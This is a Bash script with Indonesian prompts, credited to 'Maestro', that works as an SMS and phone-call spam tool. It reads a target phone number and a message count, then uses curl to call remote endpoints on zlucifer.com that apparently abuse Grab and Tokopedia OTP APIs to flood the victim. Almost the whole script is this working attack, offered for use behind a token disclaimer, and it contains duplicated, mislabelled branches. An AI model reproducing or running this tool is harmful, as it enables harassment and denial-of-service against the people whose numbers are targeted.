#!/bin/bash
#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
#GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
troll(){
    clear
figlet Maestro | lolcat
echo "[!]PERINGATAN : Jangan di salah Gunakan Ya kentod!" | lolcat
    sleep 0.03
    echo "[{}]=========================[{}]" | lolcat
    sleep 2
    echo "Author          : Maestro" | lolcat
    echo "Facebook    : Maestro" | lolcat
    echo "Type             Spam Call/SMS" | lolcat
    sleep 0.7
    echo "[{}]=========================[{}]" | lolcat
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/sms.php)
get_call=$(curl -s http://zlucifer.com/api/call.php)
mulai (){
    echo "[+]Gunakan Tools Lagi?" | lolcat
    echo "[!]y/n"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "[*]Terimakasih sudah menggunakan Tools nya" | lolcat
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "{===============}" | lolcat
    echo "[1] Spam SMS" | lolcat
    echo "[2] Spam Telp" | lolcat
    echo "[3] exit" | lolcat
    echo "{===============}" | lolcat
    echo
    echo "[!]1/2/3"
    read pilih
    if [ $pilih = "1" ]; then
            echo " Spam SMS" | lolcat
            #function spam
            echo
            echo "Silahkan masukan nomor  Target" | lolcat
            echo misal... 0813123456789
            read target # masukin no telp
            echo
            echo "Jumbal Spam yang di Inginkan?" | lolcat
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "Tunggu sampai selesai Jangan di Keluarkan!" | lolcat
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan tools dengan Bijaksana" | lolcat
                    echo
                    echo " Tools By: " | lolcat
                    echo " -Maestro-" | lolcat
                    echo "======================================="
            else
                    echo "ERORR"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Troll Spam Call"
            #function spam
            echo
            echo "Silahkan masukan nomor  Target" | lolcat
            echo misal... 0813123456789
            read target # masukin no telp
            echo
            echo "Jumbal Spam yang di Inginkan?" | lolcat
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "Tunggu sampai selesai Jangan di Keluarkan!" | lolcat
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan tools dengan Bijaksana" | lolcat
                    echo
                    echo " Tools By: " | lolcat
                    echo " -Maestro-" | lolcat
                    echo "======================================="
            else
                    echo "ERORR"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Troll Spam Call"
            #function spam
            echo
            echo "Silahkan masukan nomor  Target"
            echo misal... 08136047xxxx
            read target # masukin no telp
            echo
            echo "Gunakan API Grab/Toped?"
            echo "{=============}" | lolcat
            echo "[1] GRAB" | lolcat
            echo "[2] TOPED" | lolcat
            echo "{=============}" | lolcat
            echo "[!]1/2"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam " benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo "Tunggu sampai selesai Jangan di Keluarkan!" | lolcat
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Gunakan tools dengan bijaksana"
                  echo
                  echo " Tools By: Maestro"
                  echo " -Maestro-"
                  echo "========================================"
            else
                  echo Kesalahan, silahkan coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Terimakasih sudah menggunakan Tools Kami"
        close
    else
        clear
        echo "ERORR"
        mulai
    fi
}
close(){
    exit
    }
clear
echo "Loading.."
load
clear
troll
echo Selamat datang Jones :v, Siapa nama? #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo Selamat datang $nick ",Jones :v"
echo
echo "Mulai Tools?" | lolcat
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
